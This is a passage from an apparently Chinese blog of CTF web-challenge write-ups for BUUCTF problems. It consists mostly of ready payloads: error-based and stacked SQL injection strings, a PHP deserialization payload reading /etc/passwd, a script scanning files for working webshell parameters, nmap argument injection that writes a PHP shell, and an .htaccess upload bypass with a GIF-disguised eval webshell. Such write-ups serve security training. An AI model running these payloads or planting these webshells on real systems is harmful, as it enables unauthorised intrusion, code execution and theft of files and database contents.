class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();                                   <span class="comment">//初始化一个curl会话</span></span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);                 <span class="comment">//设置需要抓取的URL</span></span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);         <span class="comment">//设置cURL 参数，要求结果保存到字符串中还是输出到屏幕上</span></span><br><span class="line">        <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);                            <span class="comment">//运行cURL，请求网页</span></span><br><span class="line">        <span class="variable">$httpCode</span> = curl_getinfo(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close(<span class="variable">$ch</span>);          <span class="comment">//关闭一个curl会话，唯一的参数是curl_init()函数返回的句柄</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里利用ssrf去读我们要的flag文件，同时利用到了上面的no参数的注入</p><p>views.php部分代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$no</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;no&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$db</span>-&gt;anti_sqli(<span class="variable">$no</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no hack ~_~&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$res</span> = <span class="variable">$db</span>-&gt;getUserByNo(<span class="variable">$no</span>);</span><br><span class="line"><span class="variable">$user</span> = unserialize(<span class="variable">$res</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"><span class="comment">//print_r($res);</span></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$response</span> = <span class="variable">$user</span>-&gt;getBlogContents();</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$response</span> === <span class="number">404</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;404 Not found&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$base64</span> = base64_encode(<span class="variable">$response</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;iframe width=&#x27;100%&#x27; height=&#x27;10em&#x27; src=&#x27;data:text/html;base64,<span class="subst">&#123;$base64&#125;</span>&#x27;&gt;&quot;</span>;</span><br><span class="line">        <span class="comment">// echo $response;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// var_dump($user-&gt;getBlogContents());</span></span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?username=admin%<span class="number">27</span><span class="keyword">or</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select(password)<span class="keyword">from</span>(H4rDsq1)),<span class="number">0x7e</span>),<span class="number">1</span>))%<span class="number">23</span>&amp;password=<span class="number">123</span></span><br><span class="line">updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(SELECT(database())),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line">updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select(group_concat(table_name))<span class="keyword">from</span>(information_schema.tables)where(table_schema)like(database())),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line">updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select(group_concat(column_name))<span class="keyword">from</span>(information_schema.columns)where(table_name)like(<span class="string">&#x27;H4rDsq1&#x27;</span>)),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line">updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select(password)<span class="keyword">from</span>(H4rDsq1)),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">username=<span class="number">44</span>&amp;password=<span class="number">1</span>%<span class="number">27</span>^extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select(left(password,<span class="number">30</span>))<span class="keyword">from</span>(geek.H4rDsq1))))%<span class="number">23</span></span><br><span class="line">username=<span class="number">44</span>&amp;password=<span class="number">1</span>%<span class="number">27</span>^extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select(right(password,<span class="number">30</span>))<span class="keyword">from</span>(geek.H4rDsq1))))%<span class="number">23</span></span><br></pre></td></tr></table></figure><h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>如果查询的数据不存在的时候，union查询就会构造一个虚拟的数据。sql的password会md5加密，然后我们将我们自己输的密码编码成md5然后放入第三列当中。列是什么可以用union来测试</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=<span class="number">1</span><span class="string">&#x27; union select 1,&#x27;</span>admin<span class="string">&#x27;,&#x27;</span><span class="number">202</span>cb962ac59075b964b07152d234b70<span class="string">&#x27; %23 &amp;pw=123</span></span><br></pre></td></tr></table></figure><h2 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h2><p>很多冒充的webshell的时候如何找到可以使用的，脚本如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&#x27;开始时间：  &#x27;</span>+  time.asctime( time.localtime(time.time()) ))</span><br><span class="line">s1=threading.Semaphore(<span class="number">100</span>)    <span class="comment">#这儿设置最大的线程数</span></span><br><span class="line">filePath = r<span class="string">&quot;D:/soft/phpstudy/PHPTutorial/WWW/src/&quot;</span></span><br><span class="line">os.chdir(filePath)<span class="comment">#改变当前的路径</span></span><br><span class="line">requests.adapters.DEFAULT_RETRIES = <span class="number">5</span><span class="comment">#设置重连次数，防止线程数过高，断开连接</span></span><br><span class="line">files = os.listdir(filePath)</span><br><span class="line">session = requests.Session()</span><br><span class="line">session.keep_alive = <span class="literal">False</span> <span class="comment"># 设置连接活跃状态为False</span></span><br><span class="line">def get_content(file):</span><br><span class="line">    s1.acquire()</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&#x27;trying   &#x27;</span>+file+ <span class="string">&#x27;     &#x27;</span>+ time.asctime( time.localtime(time.time()) ))</span><br><span class="line">    with open(file,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:<span class="comment">#打开php文件，提取所有的$_GET和$_POST的参数</span></span><br><span class="line">            gets = <span class="keyword">list</span>(re.findall(<span class="string">&#x27;\$_GET\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">            posts = <span class="keyword">list</span>(re.findall(<span class="string">&#x27;\$_POST\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">    data = &#123;&#125;<span class="comment">#所有的$_POST</span></span><br><span class="line">    params = &#123;&#125;<span class="comment">#所有的$_GET</span></span><br><span class="line">    <span class="keyword">for</span> m in gets:</span><br><span class="line">        params[m] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> n in posts:</span><br><span class="line">        data[n] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    url = <span class="string">&#x27;http://127.0.0.1/src/&#x27;</span>+file</span><br><span class="line">    req = session.post(url, data=data, params=params)<span class="comment">#一次性请求所有的GET和POST</span></span><br><span class="line">    req.close()<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">    req.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    content = req.text</span><br><span class="line">    <span class="comment">#print(content)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> in content:<span class="comment">#如果发现有可以利用的参数，继续筛选出具体的参数</span></span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> a in gets:</span><br><span class="line">            req = session.get(url+<span class="string">&#x27;?%s=&#x27;</span>%a+<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>)</span><br><span class="line">            content = req.text</span><br><span class="line">            req.close()<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> in content:</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> b in posts:</span><br><span class="line">                req = session.post(url, data=&#123;b:<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>&#125;)</span><br><span class="line">                content = req.text</span><br><span class="line">                req.close()<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> in content:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">1</span>:<span class="comment">#flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，</span></span><br><span class="line">            param = a</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            param = b</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&#x27;找到了利用文件： &#x27;</span>+file+<span class="string">&quot;  and 找到了利用的参数：%s&quot;</span> %param)</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&#x27;结束时间：  &#x27;</span> + time.asctime(time.localtime(time.time())))</span><br><span class="line">    s1.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in files:<span class="comment">#加入多线程</span></span><br><span class="line">   t = threading.Thread(target=get_content, args=(i,))</span><br><span class="line">   t.start()</span><br></pre></td></tr></table></figure><h2 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h2><ol><li><p>正常构造payload的话因为$op、$fliename、$content都是protected属性，序列化的的结果的属性名前面会有/002.php&gt;7.1版本对类属性的检测不严格来绕过，将序列化里的portected属性换成public属性，就不会有/00，另一种方式在php打序列化字符串中只要把其中的s改成大写打S，后面打字符串就可以用十六进制表示，用php脚本来完成替换，参考下面payload</p></li><li><p>读取/proc/self/cmdline，得到取配置文件路径/web/config/httpd.conf，再得到绝对路径</p></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>=<span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// echo urlencode(serialize(new FileHandler));</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a </span>= serialize(<span class="keyword">new</span> FileHandler);</span><br><span class="line"><span class="comment">// echo $a;</span></span><br><span class="line"><span class="variable">$a </span>= str_replace(chr(<span class="number">0</span>),<span class="string">&#x27;\00&#x27;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$a </span>= str_replace(<span class="string">&#x27;s:&#x27;</span>,<span class="string">&#x27;S:&#x27;</span>,<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="BJDCTF-2nd-fake-google"><a href="#BJDCTF-2nd-fake-google" class="headerlink" title="[BJDCTF 2nd]fake google"></a>[BJDCTF 2nd]fake google</h2><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/ssti.png"></p><p>tplmap可以一梭子，但需要py2环境，也可以一步一步手注走</p><h2 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">WEB-INF主要包含一下文件或目录:</span><br><span class="line">/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</span><br><span class="line">/WEB-INF/classes/：含了站点所有用的 <span class="class"><span class="keyword">class</span> 文件，包括 <span class="title">servlet</span> <span class="title">class</span> 和非<span class="title">servlet</span> <span class="title">class</span>，他们不能包含在 .<span class="title">jar</span>文件中</span></span><br><span class="line"><span class="class">/<span class="title">WEB</span>-<span class="title">INF</span>/<span class="title">lib</span>/：存放<span class="title">web</span>应用需要的各种<span class="title">JAR</span>文件，放置仅在这个应用中要求使用的<span class="title">jar</span>文件,如数据库驱动<span class="title">jar</span>文件</span></span><br><span class="line"><span class="class">/<span class="title">WEB</span>-<span class="title">INF</span>/<span class="title">src</span>/：源码目录，按照包名结构放置各个<span class="title">java</span>文件。</span></span><br><span class="line"><span class="class">/<span class="title">WEB</span>-<span class="title">INF</span>/<span class="title">database</span>.<span class="title">properties</span>：数据库配置文件</span></span><br><span class="line"><span class="class">漏洞检测以及利用方法：通过找到<span class="title">web</span>.<span class="title">xml</span>文件，推断<span class="title">class</span>文件的路径，最后直接<span class="title">class</span>文件，在通过反编译<span class="title">class</span>文件，得到网站源码</span></span><br></pre></td></tr></table></figure><p>主要是要知道去读WEB-INF/web.xml，然后把那些class下载下来</p><h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p>三种办法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">handler</span><br><span class="line"><span class="number">1</span><span class="string">&#x27;;handler `1919810931114514` open as `yunenctf`;handler `yunenctf` read first;#</span></span><br><span class="line"><span class="string"># handler `1919810931114514` open as `yunenctf`; 将数据表载入并将返回句柄重命名</span></span><br><span class="line"><span class="string"># handler `yunenctf` read first; 读取指定句柄的首行数据</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">重命名</span></span><br><span class="line"><span class="string">1&#x27;</span>; rename table words to word1; rename table `<span class="number">1919810931114514</span>` to words; alter table words add id <span class="keyword">int</span> unsigned not <span class="literal">Null</span> auto_increment primary key; alter table words change flag data varchar(<span class="number">100</span>);<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">预编译prepare</span><br><span class="line"><span class="number">1</span><span class="string">&#x27;;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#</span></span><br></pre></td></tr></table></figure><h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><p>escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数</p><p>功能 ：escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，shell 函数包含 exec(), system() 执行运算符(反引号)</p><p>escapeshellcmd — shell 元字符转义</p><p>功能：escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。</p><p>反斜线（\）会在以下字符之前插入： &amp;#;`|?~&lt;&gt;^()[]{}$<em>, \x0A 和 \xFF</em>。 *’ 和 “ 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。</p><p>主要用到nmap的两个参数-iL 和-oN 以任意格式输出，-oX不行，这样不会把/flag的内容输出，必须要用-N才能解析/flag中的内容，从而输出到指定的路径，像这种短的代码都可以拿到本地来测试，也很方便调试。</p><p>payload:&#39; + -iL /flag + -oN 输出路径</p><p>将payload构造成 ?host=&#39; <?php @systeml($_GET["outx"]);?> -oG outx.php &#39; 前面的127.0.0.1我们可以不写，然后在payload的最后面加上一个空格和单引号，单引号的目的是闭合处理后得到的最后那个单引号，如果不加空格的话文件最后面会变成&#39;\&#39;&#39;&#39;即文件最后面会多出来\，加了空格之后会变成 hack.php \ ，不影响命令的执行。</p><h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><p>先上传一个.htaccess</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;x.php.jpg&quot;</span>&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>意思是把jpg按php进行解析，然后上传一个shell就可以了，不知道为啥file_get_contents不行，于是直接include了一下，或者用readfile(&#39;/flag&#39;);和highlight_file(&#39;/flag&#39;);</p><h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><p>源码</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">I put something <span class="keyword">in</span> F12 <span class="keyword">for</span> you</span><br><span class="line">include <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">$flag=<span class="string">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(isset($_GET[<span class="string">&#x27;gg&#x27;</span>])&amp;&amp;isset($_GET[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">    $id=$_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    $gg=$_GET[<span class="string">&#x27;gg&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;</span><br><span class="line">        echo <span class="string">&#x27;You got the first step&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(isset($_POST[<span class="string">&#x27;passwd&#x27;</span>])) &#123;</span><br><span class="line">            $passwd=$_POST[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (!is_numeric($passwd))</span><br><span class="line">            &#123;</span><br><span class="line">                 <span class="keyword">if</span>($passwd==<span class="number">1234567</span>)</span><br><span class="line">                 &#123;</span><br><span class="line">                     echo <span class="string">&#x27;Good Job!&#x27;</span>;</span><br><span class="line">                     highlight_file(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">                     die(<span class="string">&#x27;By Retr_0&#x27;</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                 &#123;</span><br><span class="line">                     echo <span class="string">&quot;can you think twice??&quot;</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                echo <span class="string">&#x27;You can not get it !&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            die(<span class="string">&#x27;only one way to get the flag&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        echo <span class="string">&quot;You are not a real hacker!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    die(<span class="string">&#x27;Please input first&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;Please input first</span><br></pre></td></tr></table></figure><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//87d242ef-fc4f-4a1f-aa1c-74a3ce74c7b4.node3.buuoj.cn/?gg[]=1&amp;id[]=2</span></span><br><span class="line"></span><br><span class="line">POST: passwd=1234567a</span><br></pre></td></tr></table></figure><h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><p>根据各种提示，上传不了ph*的文件，考虑先上传一个.htaccess</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;x.php.jpg&quot;</span>&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>在上传一个php的马，注意他会检测&lt;?php，用下面的马绕过即可，flag在根目录下</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GIF89a&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="built_in">eval</span>($_GET[x]);&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">GET /upload/05a4cc97edcd0f5544958e086a68db2c/x.php.jpg?x=var_dump(file_get_contents(%<span class="number">27</span>/flag%<span class="number">27</span>));</span><br></pre></td></tr></table></figure><h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p>目录扫.git，用githack还原后源码</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">echo <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(isset($_GET[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, NULL, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, $_GET[<span 